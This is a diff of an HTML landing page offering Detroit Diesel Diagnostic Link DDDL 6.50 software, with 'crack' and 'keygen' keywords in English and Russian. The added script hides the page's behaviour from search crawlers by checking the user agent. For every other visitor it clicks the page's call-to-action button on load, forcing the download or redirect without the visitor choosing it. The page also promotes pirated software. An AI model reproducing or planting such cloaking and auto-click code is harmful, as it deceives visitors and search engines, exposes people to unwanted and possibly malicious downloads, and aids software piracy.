@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Detroit Diesel Diagnostic Link DDDL 6.50</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Detroit Diesel Diagnostic Link DDDL 6.50 for unlimited diagnostic operations on Detroit Diesels including EPA07, EPA10, and GHG14 engines.">
     <meta name="keywords" content="Detroit Diesel Diagnostic Link DDDL 6.50, DDDL 6.50 free download, Detroit Diesel diagnostic software download, Detroit Diesel software crack, Detroit Diesel software keygen, Detroit Diesel diagnostic software, DDDL 6.50 download, DDDL 6.50 crack, DDDL 6.50 keygen, Detroit Diesel EPA07 diagnostic, Detroit Diesel EPA10 diagnostic, Detroit Diesel GHG14 diagnostic, S-60 diagnostic software, MBE4000 diagnostic software, MBE900 diagnostic software, DD13 diagnostic software, DD15 diagnostic software, DD16 diagnostic software, Detroit DDEC III diagnostics, Detroit DDEC IV diagnostics, Detroit DDEC V diagnostics, MBE 900 diagnostics, MBE 4000 diagnostics, VCU diagnostic software, VCU 14.26 diagnostics, MBE troubleshooting guide, Detroit Diesel software скачать бесплатно, Detroit Diesel software взлом, Detroit Diesel software ключ, Detroit Diesel EPA07 диагностика, Detroit Diesel EPA10 диагностика, Detroit Diesel GHG14 диагностика, Detroit Diesel DDDL 6.50 скачать бесплатно, Диагностическая программа ДДДЛ 6.50 скачать, Детройт Дизель DDDL 6.50 взлом, Детройт Дизель DDDL 6.50 ключ, Детройт Дизель S-60 диагностика, Детройт Дизель MBE4000 диагностика, Детройт Дизель MBE900 диагностика, DD13 диагностика, DD15 диагностика, DD16 диагностика">
     <style>
